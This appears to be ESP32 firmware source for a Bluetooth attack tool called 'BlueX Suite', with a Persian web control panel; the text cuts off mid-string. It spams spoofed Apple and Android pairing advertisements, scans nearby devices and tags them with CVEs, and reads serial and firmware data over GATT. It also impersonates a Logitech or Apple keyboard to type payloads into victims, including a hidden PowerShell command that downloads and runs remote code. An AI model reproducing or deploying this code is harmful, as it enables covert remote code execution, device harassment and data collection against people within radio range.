String getVendorFromOUI(String mac) {
  String oui = mac.substring(0, 8);
  oui.toUpperCase();
  int count = sizeof(OUI_TABLE) / sizeof(OUI_TABLE[0]);
  for (int i = 0; i < count; i++) {
    if (oui == OUI_TABLE[i].prefix) return OUI_TABLE[i].vendor;
  }
  return "";
}

// ====================== دیتابیس CVE ======================
struct CVEDBEntry {
  const char* cveId;
  const char* name;
  const char* btType;
  const char* severity;
  const char* vendor;
  const char* protocol;
};

const CVEDBEntry CVEDB[] = {
  {"CVE-2017-1000253","BlueBorne","Both","Critical","Android",""},
  {"CVE-2019-9506","KNOB","Both","High","",""},
  {"CVE-2020-10135","BIAS","Classic","High","",""},
  {"CVE-2020-10136","BLESA","BLE","High","",""},
  {"CVE-2020-15802","BLURTooth","Both","High","",""},
  {"CVE-2020-0022","BlueFrag","Classic","Critical","Android",""},
  {"CVE-2023-23531","Apple BLE","BLE","High","Apple",""},
  {"CVE-2022-32899","Apple BLE","BLE","High","Apple",""},
  {"CVE-2022-24521","Win Bluetooth","Both","Critical","Windows",""},
  {"CVE-2023-36025","Win Bluetooth","BLE","High","Windows",""},
  {"CVE-2023-45866","BlueZ","Both","Critical","Linux",""},
  {"CVE-2023-40087","Android BLE","BLE","High","Android",""},
  {"CVE-2024-0044","Android BT","Both","High","Android",""},
  {"CVE-2023-33199","Samsung BT","Both","High","Samsung",""},
  {"CVE-2024-32887","Samsung BT","Both","High","Samsung",""},
  {"CVE-2022-22071","Qualcomm BT","Both","Critical","Qualcomm",""},
  {"HID-INJECT","HID Attack","Both","Critical","",""}
};

int getCVEDBCount() { return sizeof(CVEDB) / sizeof(CVEDB[0]); }

String mapVendorToCVELabel(String vendor) {
  String v = vendor; v.toLowerCase();
  if (v.indexOf("apple") != -1) return "Apple";
  if (v.indexOf("samsung") != -1) return "Samsung";
  if (v.indexOf("google") != -1) return "Google";
  if (v.indexOf("microsoft") != -1) return "Windows";
  if (v.indexOf("xiaomi") != -1 || v.indexOf("huawei") != -1 || v.indexOf("oneplus") != -1 || v.indexOf("realme") != -1 || v.indexOf("oppo") != -1) return "Android";
  if (v.indexOf("linux") != -1 || v.indexOf("intel") != -1) return "Linux";
  if (v.indexOf("dell") != -1 || v.indexOf("hp") != -1 || v.indexOf("lenovo") != -1 || v.indexOf("asus") != -1) return "Windows";
  return "";
}

String matchCVEsForDevice(String vendor, String protocol, String btType, bool connectable) {
  if (!connectable) return "None";
  String result = "";
  int count = getCVEDBCount();
  int matched = 0;
  String vendorLabel = mapVendorToCVELabel(vendor);
  for (int i = 0; i < count && matched < 1; i++) {
    String cveBt = CVEDB[i].btType;
    String cveVendor = CVEDB[i].vendor;
    
    bool btMatch = (btType == "BLE" && (cveBt == "BLE" || cveBt == "Both"));
    if (!btMatch) continue;
    
    if (cveVendor.length() > 0 && vendorLabel.length() > 0 && vendorLabel != cveVendor) continue;
    if (cveVendor.length() > 0 && vendorLabel.length() == 0) continue;

    if (matched > 0) result += " | ";
    result += String(CVEDB[i].cveId) + " [" + CVEDB[i].severity + "]";
    matched++;
  }
  return (result == "") ? "None" : result;
}

String getThreatLevel(String cveString, bool connectable, String category) {
  if (cveString.indexOf("Critical") != -1) return "Critical";
  if (cveString.indexOf("High") != -1) return "High";
  if (cveString.indexOf("Medium") != -1) return "Medium";
  if (!connectable) return "Info";
  if (category == "Phone" || category == "PC") return "Medium";
  return "Low";
}

float calculateDistance(int rssi, int txPower) {
  float measuredPower = (txPower != 0) ? (float)txPower : -59.0;
  float n = 2.5;
  float ratio = (measuredPower - (float)rssi) / (10.0 * n);
  float distance = pow(10.0, ratio);
  if (distance < 0.2) distance = 0.2;
  if (distance > 10.0) distance = 10.0;
  return round(distance * 10.0) / 10.0;
}

#define MAX_DEVICES 60
struct DiscoveredDevice {
  String name;
  String mac;
  int rssi;
  float distance;
  String protoType;
  String bleVersion;
  String deviceCategory;
  String iconClass;
  String vendor;
  String cveMatch;
  String threatLevel;
  String protocolDetected;
  bool connectable;
};

DiscoveredDevice reconList[MAX_DEVICES];
int reconCount = 0;

String jsonEscape(String s) {
  s.replace("\\","\\\\"); s.replace("\"","\\\"");
  s.replace("\r","\\r"); s.replace("\n","\\n"); s.replace("\t","\\t");
  return s;
}

String detectDeviceCategory(String name, String& icon) {
  String n = name; n.toLowerCase();
  if (n.indexOf("watch")!=-1||n.indexOf("band")!=-1||n.indexOf("fit")!=-1) { icon="W"; return "Watch"; }
  if (n.indexOf("pod")!=-1||n.indexOf("bud")!=-1||n.indexOf("headphone")!=-1||n.indexOf("speaker")!=-1||n.indexOf("jbl")!=-1||n.indexOf("sony")!=-1||n.indexOf("airpods")!=-1) { icon="H"; return "Audio"; }
  if (n.indexOf("iphone")!=-1||n.indexOf("galaxy")!=-1||n.indexOf("pixel")!=-1||n.indexOf("xiaomi")!=-1||n.indexOf("phone")!=-1||n.indexOf("samsung")!=-1) { icon="P"; return "Phone"; }
  if (n.indexOf("laptop")!=-1||n.indexOf("pc")!=-1||n.indexOf("macbook")!=-1||n.indexOf("windows")!=-1) { icon="L"; return "PC"; }
  icon="B"; return "BT Device";
}

uint8_t getMfrByte(BLEAdvertisedDevice& device, int index) {
  if (!device.haveManufacturerData()) return 0;
  String mfr = device.getManufacturerData();
  if ((int)mfr.length() <= index) return 0;
  return (uint8_t)mfr.charAt(index);
}

int getMfrLength(BLEAdvertisedDevice& device) {
  if (!device.haveManufacturerData()) return 0;
  return (int)device.getManufacturerData().length();
}

String detectProtocol(BLEAdvertisedDevice& device) {
  if (device.haveServiceUUID()) {
    if (device.isAdvertisingService(BLEUUID("0000FE2C-0000-1000-8000-00805F9B34FB"))) return "FastPair";
  }
  return "BLE";
}

String detectBLEVersion(BLEAdvertisedDevice& device) {
  if (device.haveServiceData()) return "Bluetooth 5.0/5.2";
  if (device.isConnectable()) return "Bluetooth 4.2/5.0";
  return "Bluetooth 4.0 BLE";
}

void fillEnhancedBLE(int idx, BLEAdvertisedDevice& device) {
  reconList[idx].vendor = getVendorFromOUI(reconList[idx].mac);
  int txPower = device.haveTXPower() ? device.getTXPower() : -59;
  reconList[idx].distance = calculateDistance(reconList[idx].rssi, txPower);
  reconList[idx].connectable = device.isConnectable();
  reconList[idx].protocolDetected = detectProtocol(device);
  reconList[idx].bleVersion = detectBLEVersion(device);
  reconList[idx].cveMatch = matchCVEsForDevice(reconList[idx].vendor, reconList[idx].protocolDetected, "BLE", reconList[idx].connectable);
  reconList[idx].threatLevel = getThreatLevel(reconList[idx].cveMatch, reconList[idx].connectable, reconList[idx].deviceCategory);
}

void sortReconByRSSI() {
  for (int i = 0; i < reconCount - 1; i++) {
    for (int j = i + 1; j < reconCount; j++) {
      if (reconList[j].rssi > reconList[i].rssi) {
        DiscoveredDevice tmp = reconList[i]; reconList[i] = reconList[j]; reconList[j] = tmp;
      }
    }
  }
}

BLEScan* pBLEScan = nullptr;
BLEAdvertising* pAdvertising = nullptr;

class ScanCallbacks : public BLEAdvertisedDeviceCallbacks {
  void onResult(BLEAdvertisedDevice advertisedDevice) {
    if (reconCount >= MAX_DEVICES) return;
    String devName = advertisedDevice.haveName() ? advertisedDevice.getName().c_str() : "";
    if (devName == "") devName = "Unknown BLE";
    String devMac = advertisedDevice.getAddress().toString().c_str();
    int devRssi = advertisedDevice.getRSSI();
    bool exists = false;
    for (int j = 0; j < reconCount; j++) {
      if (reconList[j].mac == devMac) { exists = true; break; }
    }
    if (exists) return;
    String icon = "", category = detectDeviceCategory(devName, icon);
    reconList[reconCount].name = devName;
    reconList[reconCount].mac = devMac;
    reconList[reconCount].rssi = devRssi;
    reconList[reconCount].protoType = "BLE";
    reconList[reconCount].deviceCategory = category;
    reconList[reconCount].iconClass = icon;
    fillEnhancedBLE(reconCount, advertisedDevice);
    reconCount++;
  }
};

// ====================== مدیریت سرور HID ======================
void initHidServer(String devName) {
  attackRunning = false;
  if (pAdvertising != nullptr) {
    pAdvertising->stop();
  }

  currentHidName = devName;
  esp_ble_gap_set_device_name(currentHidName.c_str());

  if (bleKeyboard != nullptr) {
    delete bleKeyboard;
    bleKeyboard = nullptr;
  }
  
  bleKeyboard = new BleKeyboard(currentHidName.c_str(), "Logitech Inc.", 100);
  bleKeyboard->begin();

  delay(150);
  BLEAdvertising* hidAdv = BLEDevice::getAdvertising();
  if (hidAdv != nullptr) {
    BLEAdvertisementData advData;
    advData.setFlags(0x06);
    advData.setAppearance(0x03C1);
    advData.setName(currentHidName.c_str());
    hidAdv->setAdvertisementData(advData);
    
    BLEAdvertisementData scanResponseData;
    scanResponseData.setName(currentHidName.c_str());
    hidAdv->setScanResponseData(scanResponseData);
    
    hidAdv->start();
  }
  
  hidModeActive = true;
}

// === توابع استخراج GATT (اصلاح‌شده) ===
String readGattExploit(String macAddress) {
  BLEAddress address(macAddress);
  BLEClient* pClient = BLEDevice::createClient();
  
  if (!pClient->connect(address)) {
    return "{\"error\":\"خطا در اتصال به دستگاه (ممکن است پوشش بلوتوث خارج از محدوده یا غیرقابل اتصال باشد)\"}";
  }

  String battery = "یافت نشد / پنهان";
  String manufacturer = "یافت نشد";
  String model = "یافت نشد";
  String serial = "یافت نشد";
  String firmware = "یافت نشد";

  BLERemoteService* pBatteryService = pClient->getService(BLEUUID("180F"));
  if (pBatteryService != nullptr) {
    BLERemoteCharacteristic* pBatteryChar = pBatteryService->getCharacteristic(BLEUUID("2A19"));
    if (pBatteryChar != nullptr && pBatteryChar->canRead()) {
      String val = pBatteryChar->readValue();
      if (val.length() > 0) {
        battery = String((int)val[0]) + "%";
      }
    }
  }

  BLERemoteService* pDisService = pClient->getService(BLEUUID("180A"));
  if (pDisService != nullptr) {
    BLERemoteCharacteristic* pChar = pDisService->getCharacteristic(BLEUUID("2A29"));
    if (pChar != nullptr && pChar->canRead()) {
      String val = pChar->readValue();
      if (val.length() > 0) manufacturer = val;
    }
    pChar = pDisService->getCharacteristic(BLEUUID("2A24"));
    if (pChar != nullptr && pChar->canRead()) {
      String val = pChar->readValue();
      if (val.length() > 0) model = val;
    }
    pChar = pDisService->getCharacteristic(BLEUUID("2A25"));
    if (pChar != nullptr && pChar->canRead()) {
      String val = pChar->readValue();
      if (val.length() > 0) serial = val;
    }
    pChar = pDisService->getCharacteristic(BLEUUID("2A26"));
    if (pChar != nullptr && pChar->canRead()) {
      String val = pChar->readValue();
      if (val.length() > 0) firmware = val;
    }
  }

  pClient->disconnect();
  delete pClient;

  String json = "{";
  json += "\"battery\":\"" + jsonEscape(battery) + "\",";
  json += "\"manufacturer\":\"" + jsonEscape(manufacturer) + "\",";
  json += "\"model\":\"" + jsonEscape(model) + "\",";
  json += "\"serial\":\"" + jsonEscape(serial) + "\",";
  json += "\"firmware\":\"" + jsonEscape(firmware) + "\"";
  json += "}";
  return json;
}

// === توابع تخصصی تزریق پیلود اندروید و ویندوز ===

void injectAndroidPayload(String targetUrl) {
  if (!hidModeActive || bleKeyboard == nullptr || !bleKeyboard->isConnected()) return;

  bleKeyboard->write(KEY_RETURN);
  delay(800);

  bleKeyboard->press(KEY_LEFT_CTRL);
  bleKeyboard->press(' ');
  bleKeyboard->releaseAll();
  delay(300);

  bleKeyboard->press(KEY_LEFT_GUI);
  bleKeyboard->press('b');
  bleKeyboard->releaseAll();
  delay(2500); 
  
  bleKeyboard->write(KEY_RETURN);
  delay(800);
  
  bleKeyboard->press(KEY_LEFT_CTRL);
  bleKeyboard->press('l');
  bleKeyboard->releaseAll();
  delay(800); 
  
  for(int i = 0; i < targetUrl.length(); i++) {
    bleKeyboard->print(targetUrl[i]);
    delay(20);
  }
  
  delay(600);
  bleKeyboard->write(KEY_RETURN);
}

void injectWindowsPayload(String payload, bool isCmd) {
  if (!hidModeActive || bleKeyboard == nullptr || !bleKeyboard->isConnected()) return;

  bleKeyboard->press(KEY_LEFT_GUI);
  bleKeyboard->press('r');
  bleKeyboard->releaseAll();
  delay(1500); 
  
  String finalCommand = "";
  if (isCmd) {
    finalCommand = "powershell -w hidden -c \"irm " + payload + "|iex\"";
  } else {
    finalCommand = payload;
  }
  
  for(int i = 0; i < finalCommand.length(); i++) {
    bleKeyboard->print(finalCommand[i]);
    delay(20);
  }
  
  delay(800);
  bleKeyboard->write(KEY_RETURN);
}

// ====================== توابع جنریت پکت‌ها ======================
void generateApplePacket(const AppleDevice& device, uint8_t* buffer, size_t& outLength) {
  memset(buffer, 0, 31);
  if (device.type == APPLE_AUDIO) {
    outLength = 31;
    uint8_t header[] = {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07};
    uint8_t body[] = {0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12};
    memcpy(buffer, header, 7);
    buffer[7] = device.modelId;
    buffer[8] = random(0,256); buffer[9] = random(0,256);
    memcpy(buffer+10, body+2, 9);
  } else {
    outLength = 23;
    uint8_t prefix[] = {0x16,0xff,0x4c,0x00,0x04,0x04,0x2a,0x00,0x00,0x00,0x0f,0x05,0xc1};
    uint8_t suffix[] = {0x60,0x4c,0x95,0x00,0x00,0x10,0x00,0x00,0x00};
    memcpy(buffer, prefix, 13);
    buffer[13] = device.modelId;
    memcpy(buffer+14, suffix, 9);
  }
}

void generateOtherPacket(uint8_t* buffer, size_t& outLength) {
  int totalDevices = sizeof(OTHER_DEVICES)/sizeof(OTHER_DEVICES[0]);
  int idx;
  do { idx = random(0, totalDevices); } while (totalDevices > 1 && idx == lastOtherIdx);
  lastOtherIdx = idx;
  outLength = OTHER_DEVICES[idx].length;
  if (outLength > 31) outLength = 31;
  memcpy(buffer, OTHER_DEVICES[idx].data, outLength);
  if (outLength == 17) { for(int b=6;b<=11;b++) buffer[b]=random(0,256); buffer[12]=random(0x80,0x84); }
  if (outLength == 14) { buffer[13]=random(0,2); }
}

// ====================== رابط کاربری وب (HTML/JS) ======================
const char PAGE_HTML[] PROGMEM = R"rawliteral(<!DOCTYPE html><html lang="fa" dir="rtl"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>BlueX Suite</title><style>*{box-sizing:border-box;margin:0;padding:0}body{font-family:Tahoma,sans-serif;background:linear-gradient(135deg,#030712 0%,#0f172a 100%);color:#e2e8f0;min-height:100vh;padding:8px}.wrap{max-width:500px;margin:auto}.card{background:rgba(15,23,42,0.85);backdrop-filter:blur(12px);border-radius:18px;padding:18px;border:1px solid rgba(59,130,246,0.15);box-shadow:0 8px 32px rgba(0,0,0,0.4);margin-bottom:12px}.logo{text-align:center;margin-bottom:16px}.logo h1{font-size:26px;font-weight:800;background:linear-gradient(135deg,#00c6ff,#0072ff,#7c3aed);-webkit-background-clip:text;-webkit-text-fill-color:transparent;letter-spacing:2px}.logo .sub{font-size:9px;color:#ef4444;font-weight:bold;letter-spacing:3px;margin-top:2px}.logo .ver{font-size:8px;color:#475569;margin-top:4px}.tabs{display:flex;gap:6px;margin-bottom:14px;background:#060d1f;padding:4px;border-radius:12px;overflow-x:auto}.tab{flex:1;padding:8px;border:none;border-radius:8px;background:transparent;color:#64748b;font-weight:bold;cursor:pointer;transition:.3s;font-size:12px;white-space:nowrap}.tab.act{background:linear-gradient(135deg,#0072ff,#00c6ff);color:#fff;box-shadow:0 4px 12px rgba(0,114,255,0.3)}.pane{display:none}.pane.act{display:block;animation:fd .3s ease}@keyframes fd{from{opacity:0;transform:translateY(5px)}to{opacity:1;transform:translateY(0)}}select{width:100%;padding:11px;margin:5px 0;background:#060d1f;color:#fff;border:1px solid #1e3a8a;border-radius:10px;font-size:13px}input[type=text]{width:100%;padding:11px;margin:5px 0;background:#060d1f;color:#fff;border:1px solid #1e3a8a;border-radius:10px;font-size:13px;direction:ltr;text-align:left}button.act{width:100%;padding:13px;margin:6px 0;border:none;border-radius:12px;font-size:15px;font-weight:bold;cursor:pointer;color:#fff;transition:.3s}button.act:disabled{opacity:.4;cursor:not-allowed}.btn-blue{background:linear-gradient(135deg,#00c6ff,#0072ff)}.btn-red{background:linear-gradient(135deg,#ef4444,#dc2626)}.btn-purple{background:linear-gradient(135deg,#7c3aed,#5b21b6)}.btn-darkred{background:linear-gradient(135deg,#ef4444,#7f1d1d)}.btn-green{background:linear-gradient(135deg,#22c55e,#15803d)}.btn-gray{background:linear-gradient(135deg,#475569,#334155);font-size:13px;padding:10px}.stats{display:flex;gap:8px;margin:10px 0}.stat{flex:1;background:linear-gradient(135deg,#060d1f,#0f1c3f);border-radius:12px;padding:10px;text-align:center;border:1px solid #1e293b}.stat .val{font-size:20px;font-weight:800;color:#00c6ff;display:block}.stat .lbl{color:#64748b;font-size:9px;margin-top:2px}#status{font-size:13px;font-weight:bold;margin-top:8px;text-align:center;padding:6px;border-radius:8px}.dev{background:linear-gradient(135deg,#0f1c3f,#16204a);padding:12px;margin:7px 0;border-radius:12px;display:flex;gap:10px;align-items:flex-start;border:1px solid rgba(59,130,246,0.1);transition:.3s}.dev:hover{border-color:rgba(0,198,255,0.3);transform:translateX(-3px)}.dev .info{flex:1;min-width:0}.dev .nm{color:#38bdf8;font-weight:bold;font-size:14px;word-break:break-word}.dev .mt{color:#94a3b8;font-size:10px;margin-top:2px}.badge{display:inline-block;font-size:9px;padding:2px 7px;border-radius:5px;margin-left:4px;font-weight:bold}.b-ble{background:rgba(59,130,246,0.2);color:#93c5fd}.spin{width:22px;height:22px;border:3px solid #1e293b;border-top-color:#00c6ff;border-radius:50%;animation:rot .8s linear infinite;margin:10px auto;display:none}@keyframes rot{to{transform:rotate(360deg)}}.empty{color:#475569;text-align:center;padding:24px;font-size:13px}.empty .e-icon{font-size:32px;opacity:.5}.scan-info{font-size:12px;color:#fbbf24;margin:8px 0;text-align:center;font-weight:bold}.sec-title{font-size:11px;color:#64748b;text-transform:uppercase;letter-spacing:2px;margin-bottom:6px}.live-bar{display:flex;gap:8px;align-items:center;margin:8px 0;padding:8px;background:#060d1f;border-radius:10px}.live-bar .cnt{flex:1;font-size:12px;color:#38bdf8;font-weight:bold}</style></head><body><div class="wrap"><div class="card"><div class="logo"><h1>BlueX Suite</h1><div class="sub">RED TEAM OPERATIONS</div><div class="ver">v4.5 Ultimate</div></div><div class="tabs"><button class="tab act" onclick="sw('spam')">Spam</button><button class="tab" onclick="sw('recon')">Recon</button><button class="tab" onclick="sw('hid')">HID</button><button class="tab" onclick="sw('gatt')">GATT Exploit</button></div><div id="spam" class="pane act"><div class="sec-title">Mode</div><select id="md" onchange="rq('/mode?val='+this.value)"><option value="0">Apple Only</option><option value="1">Android + Windows</option><option value="2" selected>Mix (Apple + Other)</option></select><div class="sec-title" style="margin-top:8px">Speed</div><select id="sp" onchange="rq('/speed?val='+this.value)"><option value="0">Normal (300ms)</option><option value="1">Fast (100ms)</option><option value="2" selected>Turbo (50ms)</option></select><button id="bt" class="act btn-blue" onclick="tg()">Start Attack</button><div class="stats"><div class="stat"><span class="val" id="pk">0</span><span class="lbl">PACKETS</span></div><div class="stat"><span class="val" id="pp">0</span><span class="lbl">PKT/SEC</span></div><div class="stat"><span class="val" id="up">0s</span><span class="lbl">UPTIME</span></div></div><div id="status" style="color:#ef4444;background:rgba(239,68,68,0.1)">STOPPED</div></div><div id="recon" class="pane"><button id="sb1" class="act btn-blue" onclick="fs()">Full BLE Scan</button><button id="rb" class="act btn-purple" onclick="rt()">Live Monitor</button><div id="liveBar" class="live-bar" style="display:none"><span class="cnt" id="liveCnt">0 devices</span><button class="act btn-gray" style="width:auto;margin:0;padding:6px 14px" onclick="clearList()">Clear List</button></div><div id="ld" class="spin"></div><div id="rs" class="scan-info">Ready to scan</div><div id="dl" style="max-height:420px;overflow-y:auto;margin-top:8px"></div></div><div id="hid" class="pane"><div class="sec-title">انتخاب مدل کیبورد (Spoofing)</div><select id="hidModel"><option value="Logitech K380 Keyboard">Logitech K380 Keyboard</option><option value="Apple Magic Keyboard">Apple Magic Keyboard</option><option value="Microsoft Bluetooth Keyboard">Microsoft Bluetooth Keyboard</option><option value="HP Wireless Keyboard">HP Wireless Keyboard</option><option value="Dell Multi-Device KB740">Dell Multi-Device KB740</option></select><button class="act btn-purple" id="btnStartHid" onclick="startHidServer()">راه‌اندازی کیبورد جعلی و مانیتورینگ</button><div id="hidStatus" style="font-size:12px;margin-top:10px;text-align:center;color:#fbbf24;font-weight:bold;">وضعیت: غیرفعال</div><div id="payloadSection" style="margin-top:14px;border-top:1px solid #1e293b;padding-top:10px;display:none;"><div class="sec-title">تزریق پیلود به تارگت متصل‌شده</div><select id="payloadType" onchange="updatePayloadUI()"><option value="win_url">Windows - اجرای لینک مرورگر</option><option value="win_cmd">Windows - اجرای اسکریپت در حافظه (Fileless IEX)</option><option value="android_url">Android - اجرای لینک مرورگر</option></select><input type="text" id="targetPayload" placeholder="لینک مورد نظر (مثلا https://google.com)"><button class="act btn-green" onclick="injectPayload()">شروع تزریق</button><div id="injectStatus" style="font-size:11px;margin-top:6px;text-align:center;color:#94a3b8">تارگت بلوتوث منتظر دریافت دستورات...</div></div></div><div id="gatt" class="pane"><button class="act btn-blue" onclick="scanGattDevices()">اسکن دستگاه‌های قابل اکسپلویت (GATT)</button><div id="gattLd" class="spin"></div><div id="gattRs" class="scan-info">آماده برای اسکن سرویس‌ها</div><div id="gattList" style="max-height:240px;overflow-y:auto;margin-top:8px"></div><div id="gattModal" style="display:none;background:#060d1f;padding:12px;border-radius:12px;margin-top:10px;border:1px solid #00c6ff"><div class="sec-title" style="color:#00c6ff">اطلاعات استخراج شده از GATT</div><div id="gattContent" style="font-size:12px;color:#38bdf8;line-height:1.6;margin-top:6px"></div></div></div></div></div><script>function fa(n){return String(n).replace(/[0-9]/g,d=>'۰۱۲۳۴۵۶۷۸۹'[d])}function sw(t){document.querySelectorAll('.pane').forEach(e=>e.classList.remove('act'));document.querySelectorAll('.tab').forEach(e=>e.classList.remove('act'));document.getElementById(t).classList.add('act');event.target.classList.add('act')}function rq(u){fetch(u).catch(()=>{})}function tg(){fetch('/toggle').then(r=>r.text()).then(s=>{let b=document.getElementById('bt'),x=document.getElementById('status');if(s.trim()==='RUNNING'){b.innerText='Stop Attack';b.className='act btn-red';x.innerText='ATTACK RUNNING';x.style.color='#00c6ff';x.style.background='rgba(0,198,255,0.1)'}else{b.innerText='Start Attack';b.className='act btn-blue';x.innerText='STOPPED';x.style.color='#ef4444';x.style.background='rgba(239,68,68,0.1)'}}).catch(()=>alert('Connection error'))}setInterval(()=>{fetch('/stats').then(r=>r.json()).then(d=>{document.getElementById('pk').textContent=fa(d.packets);document.getElementById('pp').textContent=fa(d.pps);document.getElementById('up').textContent=fa(d.uptime)+'s'}).catch(()=>{})},1000);const icons={W:'\u231A',H:'\uD83C\uDFA7',P:'\uD83D\uDCF1',T:'\uD83D\uDCFA',L:'\uD83D\uDCBB','?':'\u2754',B:'\uD83D\uDCE1'};function renderList(d,isNew){const dl=document.getElementById('dl');if(!d||!d.length){if(!liveMode){dl.innerHTML='<div class="empty"><div class="e-icon">\uD83D\uDD0E</div>No devices found</div>'}return}let h='';d.forEach((x,i)=>{let tc={Critical:'t-C',High:'t-H',Medium:'t-M',Low:'t-L',Info:'t-I'}[x.threat]||'t-I';let tl=x.threat.charAt(0);let ic=icons[x.icon]||'\uD83D\uDCE1';let bc='b-ble';let bt='BLE';let newCls=(isNew&&isNew.includes(x.mac))?' new':'';let newTag=(isNew&&isNew.includes(x.mac))?'<span class="new-tag">NEW</span>':'';h+='<div class="dev'+newCls+'"><div class="ico">'+ic+'</div><div class="info"><div class="nm">'+newTag+x.name+' <span class="badge '+bc+'">'+bt+'</span><span class="th '+tc+'">'+tl+'</span></div><div class="mt">'+x.category+' | '+x.vendor+'</div><div class="mt">نسخه بلوتوث: '+x.bleVersion+'</div><div class="mt">'+x.mac+'</div><div class="mt">RSSI: '+x.rssi+' dBm | فاصله: '+x.distance+'m</div>'+(x.cve&&x.cve!=='None'?'<div class="cv">\u26A0 '+x.cve+'</div>':'')+'</div></div>'});dl.innerHTML=h}let busy=false,liveMode=false,liveDevices=[],liveTimer=null,liveSeen={};async function fs(){if(busy||liveMode)return;busy=true;let btn=document.getElementById('sb1');btn.disabled=true;let l=document.getElementById('ld'),s=document.getElementById('rs');l.style.display='block';s.innerText='در حال اسکن...';s.style.color='#fbbf24';try{let r=await fetch('/quickscan');let d=await r.json();l.style.display='none';s.innerText=fa(d.length)+' دستگاه پیدا شد';s.style.color='#22c55e';renderList(d,null)}catch(e){l.style.display='none';s.innerText='خطا - مجدد تلاش کنید';s.style.color='#ef4444'}finally{busy=false;btn.disabled=false}}function rt(){let b=document.getElementById('rb'),l=document.getElementById('ld'),s=document.getElementById('rs'),lb=document.getElementById('liveBar');if(liveMode){liveMode=false;if(liveTimer)clearTimeout(liveTimer);b.innerText='Live Monitor';b.className='act btn-purple';b.disabled=false;l.style.display='none';s.innerText='Live monitor stopped';s.style.color='#fbbf24';lb.style.display='none';document.getElementById('sb1').disabled=false;return}liveMode=true;b.innerText='Stop Live';b.className='act btn-darkred';document.getElementById('sb1').disabled=true;lb.style.display='flex';liveDevices=[];liveSeen={};updateLiveCnt();s.innerText='در حال اسکن...';s.style.color='#fbbf24';liveScan()}async function liveScan(){if(!liveMode)return;let l=document.getElementById('ld'),s=document.getElementById('rs');l.style.display='block';s.innerText='در حال اسکن زنده...';try{let r=await fetch('/quickscan');let d=await r.json();if(!liveMode)return;l.style.display='none';let newMacs=[];d.forEach(x=>{let idx=liveDevices.findIndex(y=>y.mac===x.mac);if(idx>=0){liveDevices[idx].rssi=x.rssi;liveDevices[idx].distance=x.distance;liveDevices[idx].threat=x.threat;liveSeen[x.mac]=Date.now()}else{liveDevices.push(x);liveSeen[x.mac]=Date.now();newMacs.push(x.mac)}});let now=Date.now();liveDevices=liveDevices.filter(x=>{return now-(liveSeen[x.mac]||0)<20000});let sorted=liveDevices.slice().sort((a,b)=>b.rssi-a.rssi);s.innerText=fa(liveDevices.length)+' دستگاه' + (newMacs.length?' | '+fa(newMacs.length)+' جدید':'');s.style.color='#22c55e';updateLiveCnt();renderList(sorted,newMacs)}catch(e){if(!liveMode)return;l.style.display='none';s.innerText='خطا - ادامه...';s.style.color='#ef4444'}finally{if(liveMode){liveTimer=setTimeout(liveScan,3000)}}}function updateLiveCnt(){document.getElementById('liveCnt').innerText=fa(liveDevices.length)+' دستگاه'}let hidPoll=null;function pollHidStatus(){if(hidPoll)clearInterval(hidPoll);hidPoll=setInterval(()=>{fetch('/hid_status').then(r=>r.json()).then(d=>{let sEl=document.getElementById('hidStatus');let pSec=document.getElementById('payloadSection');if(d.active&&d.connected){sEl.innerText='✅ تارگت متصل شد! آماده تزریق.';sEl.style.color='#22c55e';pSec.style.display='block';}else if(d.active&&!d.connected){sEl.innerText='کیبورد فعال است. منتظر اتصال تارگت...';sEl.style.color='#38bdf8';pSec.style.display='none';}}).catch(()=>{});},2000);}function startHidServer(){let name=document.getElementById('hidModel').value;let sEl=document.getElementById('hidStatus');let btn=document.getElementById('btnStartHid');let pSec=document.getElementById('payloadSection');btn.disabled=true;pSec.style.display='none';sEl.innerText='در حال آماده‌سازی و بازنشانی بلوتوث...';sEl.style.color='#fbbf24';if(hidPoll)clearInterval(hidPoll);fetch('/startHid?name='+encodeURIComponent(name)).then(r=>r.text()).then(s=>{let sec=10;let tInterval=setInterval(()=>{sec--;sEl.innerText='لطفا صبر کنید ('+sec+' ثانیه)...';if(sec<=0){clearInterval(tInterval);sEl.innerText='نام اعمال شد ('+name+'). منتظر اتصال...';sEl.style.color='#38bdf8';pollHidStatus();btn.disabled=false;}},1000);}).catch(()=>{sEl.innerText='خطا در راه‌اندازی';sEl.style.color='#ef4444';btn.disabled=false;});}async function scanGattDevices(){let l=document.getElementById('gattLd'),s=document.getElementById('gattRs'),dl=document.getElementById('gattList');l.style.display='block';s.innerText='در حال اسکن دستگاه‌های قابل اتصال...';dl.innerHTML='';try{let r=await fetch('/gatt_scan');let d=await r.json();l.style.display='none';s.innerText=fa(d.length)+' دستگاه یافت شد';let h='';d.forEach(x=>{h+='<div class="dev"><div class="info"><div class="nm">'+x.name+'</div><div class="mt">MAC: '+x.mac+' | RSSI: '+x.rssi+' dBm</div><button class="act btn-green" style="margin-top:6px;padding:8px;font-size:12px" onclick="exploitGatt(\''+x.mac+'\')">استخراج اطلاعات (GATT Exploit)</button></div></div>'});dl.innerHTML=h||'<div class="empty">دستگاهی یافت نشد</div>'}catch(e){l.style.display='none';s.innerText='خطا در اسکن';}}async function exploitGatt(mac){let modal=document.getElementById('gattModal'),content=document.getElementById('gattContent');modal.style.display='block';content.innerHTML='در حال اتصال به دستگاه و خواندن GATT...';try{let r=await fetch('/gatt_exploit?mac='+mac);let d=await r.json();if(d.error){content.innerHTML='<span style="color:#ef4444">'+d.error+'</span>';return;}content.innerHTML='🔋 درصد باتری: <b>'+d.battery+'</b><br>'+'🏭 نام سازنده: <b>'+d.manufacturer+'</b><br>'+'📱 مدل دستگاه: <b>'+d.model+'</b><br>'+'🔢 شماره سریال: <b>'+d.serial+'</b><br>'+'🛠️ نسخه فریمور: <b>'+d.firmware+'</b>';}catch(e){content.innerHTML='<span style="color:#ef4444">خطا در برقراری ارتباط با سرویس GATT</span>';}}function updatePayloadUI(){let t=document.getElementById('payloadType').value;let i=document.getElementById('targetPayload');if(t==='win_cmd'){i.placeholder='لینک اسکریپت (مثلا http://x.com/script.ps1)';}else{i.placeholder='لینک مورد نظر (مثلا https://google.com)';}}function injectPayload(){let t=document.getElementById('payloadType').value;let p=document.getElementById('targetPayload').value;let st=document.getElementById('injectStatus');st.innerText='در حال تایپ پیلود در گوشی/سیستم...';st.style.color='#fbbf24';fetch('/inject?type='+t+'&payload='+encodeURIComponent(p)).then(r=>r.text()).then(s=>{st.innerText='✅ پیلود با موفقیت در تارگت تایپ و اجرا 